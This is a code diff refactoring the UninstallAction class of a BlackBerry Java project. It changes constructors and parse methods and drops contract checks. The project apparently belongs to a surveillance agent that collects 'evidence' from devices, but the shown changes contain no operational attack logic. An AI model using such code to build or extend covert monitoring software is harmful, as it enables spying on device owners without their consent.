@@ -22,7 +22,6 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.evidence.Markup;
-import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
 /**
@@ -31,7 +30,6 @@ import blackberry.utils.Utils;
 public final class UninstallAction extends SubAction {
     //#ifdef DEBUG
     static Debug debug = new Debug("UninstallAction", DebugLevel.VERBOSE);
-
     //#endif
 
     /**
@@ -42,23 +40,12 @@ public final class UninstallAction extends SubAction {
      * @param confParams
      *            the conf params
      */
-    public UninstallAction(final int actionId_, final byte[] confParams) {
-        super(actionId_);
-        parse(confParams);
-
-        //#ifdef DBC
-        Check.requires(actionId == ACTION_UNINSTALL, "Wrong ActionId");
-        //#endif
-    }
-
-    /**
-     * Instantiates a new uninstall action.
-     * 
-     * @param params
-     *            the host
-     */
     public UninstallAction(final ConfAction params) {
-        super(ACTION_UNINSTALL);
+        super(params);
+    }
+    
+    protected boolean parse(ConfAction params) {
+        return true;
     }
 
     public boolean execute(Trigger trigger) {
@@ -182,16 +169,7 @@ public final class UninstallAction extends SubAction {
         return true;
     }
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.action.SubAction#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParams) {
-        //#ifdef DBC
-        Check.requires(confParams.length == 0, "params should be empty");
-        //#endif
-        return true;
-    }
+
 
     //#ifdef DEBUG
     public String toString() {
